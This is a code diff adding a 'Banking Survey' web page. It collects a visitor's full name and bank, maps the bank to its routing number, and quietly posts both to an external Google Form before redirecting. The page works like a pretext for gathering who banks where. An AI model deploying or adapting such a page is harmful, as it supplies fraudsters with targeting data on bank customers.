@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banking Survey</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"], select, input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .thank-you {
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="survey-container">
+    <h2>Banking Survey</h2>
+    <form id="survey-form">
+        <input type="text" id="full-name" placeholder="Full Name" required>
+        
+        <label for="country">Select Your Location:</label>
+        <select id="country" required>
+            <option value="">Select Your Country</option>
+            <option value="United States">United States</option>
+            <option value="Canada">Canada</option>
+            <option value="United Kingdom">United Kingdom</option>
+            <option value="Australia">Australia</option>
+        </select>
+        
+        <label for="bank">Select Your Bank:</label>
+        <select id="bank" required>
+            <option value="">Select Your Bank</option>
+            <option value="Bank of America">Bank of America</option>
+            <option value="Wells Fargo">Wells Fargo</option>
+            <option value="Chase Bank">Chase Bank</option>
+            <option value="Citibank">Citibank</option>
+            <option value="PNC Bank">PNC Bank</option>
+            <option value="Capital One">Capital One</option>
+            <option value="US Bank">US Bank</option>
+            <option value="TD Bank">TD Bank</option>
+            <option value="Regions Bank">Regions Bank</option>
+            <option value="SunTrust Bank">SunTrust Bank</option>
+            <option value="American Express Bank">American Express Bank</option>
+            <option value="BMO Harris Bank">BMO Harris Bank</option>
+            <option value="Fifth Third Bank">Fifth Third Bank</option>
+            <option value="HSBC Bank USA">HSBC Bank USA</option>
+            <option value="KeyBank">KeyBank</option>
+            <option value="M&T Bank">M&T Bank</option>
+            <option value="Citizens Bank">Citizens Bank</option>
+            <option value="Charles Schwab Bank">Charles Schwab Bank</option>
+            <option value="First Republic Bank">First Republic Bank</option>
+            <option value="Zions Bank">Zions Bank</option>
+        </select>
+        <input type="submit" value="Submit">
+    </form>
+</div>
+
+<div class="thank-you" id="thank-you">
+    <h2>Thank You!</h2>
+    <p>Your responses have been recorded.</p>
+    <p>Goodbye!</p>
+</div>
+
+<script>
+    const routingNumbers = {
+        "Bank of America": "026009593",
+        "Wells Fargo": "121000248",
+        "Chase Bank": "021000021",
+        "Citibank": "021000089",
+        "PNC Bank": "031000053",
+        "Capital One": "051403201",
+        "US Bank": "091000022",
+        "TD Bank": "031101266",
+        "Regions Bank": "062000019",
+        "SunTrust Bank": "061000104",
+        "American Express Bank": "124085244",
+        "BMO Harris Bank": "071000288",
+        "Fifth Third Bank": "042000314",
+        "HSBC Bank USA": "021001088",
+        "KeyBank": "041001039",
+        "M&T Bank": "022000046",
+        "Citizens Bank": "021302500",
+        "Charles Schwab Bank": "121100353",
+        "First Republic Bank": "321081669",
+        "Zions Bank": "124003116"
+    };
+
+    document.getElementById('survey-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const fullName = document.getElementById('full-name').value;
+        const bank = document.getElementById('bank').value;
+
+        if (routingNumbers[bank]) {
+            const routingNumber = routingNumbers[bank];
+            const data = new URLSearchParams();
+            data.append('entry.1584028678', fullName); // Full Name entry ID
+            data.append('entry.1269666438', routingNumber); // Routing Number entry ID
+
+            // Send data to Google Form
+            fetch('https://docs.google.com/forms/d/e/1FAIpQLSeRIhb14TvXKBQY3b9HnTfXC2QAr110ngw8sKlJPLemVTNSAw/formResponse', {
+                method: 'POST',
+                body: data,
+                mode: 'no-cors'
+            })
+            .then(response => {
+                // Redirect to banking survey
+                window.location.href = "banking_survey.html"; // Change to your actual banking survey URL
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        } else {
+            alert('Please select a valid bank.');
+        }
+    });
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
